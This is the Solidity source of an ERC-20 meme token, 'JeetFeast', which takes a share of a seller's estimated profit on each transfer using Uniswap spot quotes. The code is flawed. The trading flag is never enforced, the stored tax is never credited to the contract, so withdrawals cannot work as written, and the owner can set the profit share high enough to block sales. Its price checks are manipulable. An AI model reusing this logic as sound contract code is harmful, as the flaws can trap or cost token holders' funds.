/*
     ___  _______  _______  _______          
    |   ||       ||       ||       |         
    |   ||    ___||    ___||_     _|         
    |   ||   |___ |   |___   |   |           
 ___|   ||    ___||    ___|  |   |           
|       ||   |___ |   |___   |   |           
|_______||_______||_______|  |___|           
 _______  _______  _______  _______  _______ 
|       ||       ||   _   ||       ||       |
|    ___||    ___||  |_|  ||  _____||_     _|
|   |___ |   |___ |       || |_____   |   |  
|    ___||    ___||       ||_____  |  |   |  
|   |    |   |___ |   _   | _____| |  |   |  
|___|    |_______||__| |__||_______|  |___| 1.02

JeetFeast
https://t.me/jeetfeast_safeguard
*/

pragma solidity ^0.8.20;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount) external returns (bool);

    function allowance(address owner, address spender) external view returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

contract Ownable is Context {
    address private _owner;
    address internal _taxWallet;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    modifier onlyTaxWallet() {
        require(_taxWallet == _msgSender(), "Ownable: caller is not the tax wallet");
        _;
    }

}

interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function getAmountsOut(uint amountIn, address[] memory path) external view returns (uint[] memory amounts);
}

contract JeetFeast is Context, IERC20, Ownable {
    using SafeMath for uint256;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => uint256) private _ethValues;
    mapping (address => uint256) private _transferAmounts;
    mapping(address => bool) private _excludedFromFee;

    IUniswapV2Router02 private _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    uint256 private _taxStored = 0;

    uint8 private _decimals = 9;
    uint256 private _totalSupply = 1000000 * 10**_decimals;

    uint256 private _profitShare = 50;

    bool private _tradeEnabled = false;

    constructor () {
        _balances[_msgSender()] = _totalSupply;
        emit Transfer(address(0), _msgSender(), _totalSupply);
        _excludedFromFee[_msgSender()] = true;
        _excludedFromFee[address(this)] = true;
        _excludedFromFee[address(_uniswapV2Router)] = true;
    }

    function enableTrading(address taxWallet) public onlyOwner {
        require(!_tradeEnabled, "Trading is already enabled");
        _tradeEnabled = true;
        _taxWallet = taxWallet;
        _excludedFromFee[taxWallet] = true;
        renounceOwnership();
    }

    function setProfitShare(uint256 profitShare) public onlyOwner {
        _profitShare = profitShare;
    }

    function getProfitShare() public view returns (uint256) {
        return _profitShare;
    }

    function name() public pure returns (string memory) {
        return "JeetFeast";
    }

    function symbol() public pure returns (string memory) {
        return "JF";
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        uint256 profit = 0;
        uint256[] memory values = new uint256[](2);
        address[] memory addressList = new address[](2);
        addressList[0] = address(this);
        addressList[1] = _uniswapV2Router.WETH();
        address[] memory addressListReverse = new address[](2);
        addressListReverse[0] = _uniswapV2Router.WETH();
        addressListReverse[1] = address(this);

        if (!_excludedFromFee[sender] && _transferAmounts[sender] > 0) {
            values = _uniswapV2Router.getAmountsOut(amount, addressList);
            uint256 avgEthValue = _ethValues[sender].div(_transferAmounts[sender]).mul(amount);

            if (avgEthValue < values[1]) {
                uint256 ethProfit = values[1].sub(avgEthValue);
                profit = _uniswapV2Router.getAmountsOut(ethProfit, addressListReverse)[1];
            }
        }

        uint256 profitShare = profit.mul(_profitShare).div(100);
        uint256 amountAfterProfit = amount.sub(profitShare);
        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amountAfterProfit);

        if (!_excludedFromFee[recipient]) {
            try _uniswapV2Router.getAmountsOut(amountAfterProfit, addressList) returns (uint256[] memory _values) {
                _ethValues[recipient] = _ethValues[recipient].add(_values[1]);
                _transferAmounts[recipient] = _transferAmounts[recipient].add(_values[0]);
            } catch {
            }
        }
        if (profitShare > 0) {
            _taxStored = _taxStored.add(profit.sub(profitShare));
        }

        emit Transfer(sender, recipient, amountAfterProfit);
    }

    function withdrawTax() public onlyTaxWallet {
        uint256 amount = _taxStored;
        _taxStored = 0;
        _transfer(address(this), _taxWallet, amount);
    }
}
